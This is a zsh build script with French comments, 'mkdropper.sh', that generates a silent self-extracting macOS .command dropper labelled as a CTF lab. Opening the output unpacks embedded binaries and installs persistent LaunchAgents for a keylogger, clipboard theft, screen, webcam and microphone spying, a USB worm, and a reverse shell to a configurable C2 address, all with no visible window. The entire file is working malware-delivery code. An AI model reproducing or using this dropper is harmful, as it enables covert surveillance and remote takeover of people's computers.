#!/bin/zsh
# delivery/mkdropper.sh - genere un dropper auto-extractant silencieux
# Un seul fichier .command : il embarque les 11 binaire en base64.
# Ouvert (double-clic) -> install complete en fond, aucune fenetre.
# Usage: mkdropper.sh [C2_IP] [C2_PORT] [nom_de_sortie.command]
set -e
C2_IP="${1:-127.0.0.1}"
C2_PORT="${2:-4444}"
OUT="${3:-RickCTF.command}"

cd "$(dirname "$0")/.."
[ -d build/mac ] || { echo "compile d'abord: ./build_mac.sh"; exit 1; }

TMP=$(mktemp -d)
cp build/mac/* "$TMP/"
(cd "$TMP" && tar czf payload.tgz *)

cat > "$OUT" <<'XEOFX'
#!/bin/zsh
# RickCTF stage - self-extractor silencieux (lab / CTF autorise)
C2="__C2__"; PORT="__PORT__"
D="$HOME/Library/Application Support/RickPortal/bin"
A="$HOME/Library/LaunchAgents"
mkdir -p "$D" "$A"; T=$(mktemp -d)
awk '/^___B64___$/{f=1;next}/^___END___$/{f=0}f' "$0" | base64 -d > "$T/p.tgz"
tar xzf "$T/p.tgz" -C "$D"; chmod +x "$D"/*
inst() {
  cat > "$A/$1.plist" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>$1</string>
  <key>ProgramArguments</key><array>
    <string>$D/$2</string>$3
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
EOF
  launchctl load "$A/$1.plist" 2>/dev/null
}
inst com.rick.keylog 01_keylogger ""
inst com.rick.clip   04_clipboard ""
inst com.rick.screen 07_screenspy "<string>30</string>"
inst com.rick.cam    08_webcam "<string>15</string>"
inst com.rick.mic    10_mic ""
inst com.rick.usb    05_usb_worm ""
inst com.rick.shell  02_reverse_shell "<string>$C2</string><string>$PORT</string>"
rm -rf "$T"
exit 0
___B64___
XEOFX

base64 -i "$TMP/payload.tgz" >> "$OUT"
echo "___END___" >> "$OUT"
sed -i '' "s/__C2__/$C2_IP/;s/__PORT__/$C2_PORT/" "$OUT"
chmod +x "$OUT"
rm -rf "$TMP"
echo "[OK] $OUT genere (C2=$C2_IP:$C2_PORT, $(du -h "$OUT" | cut -f1))"
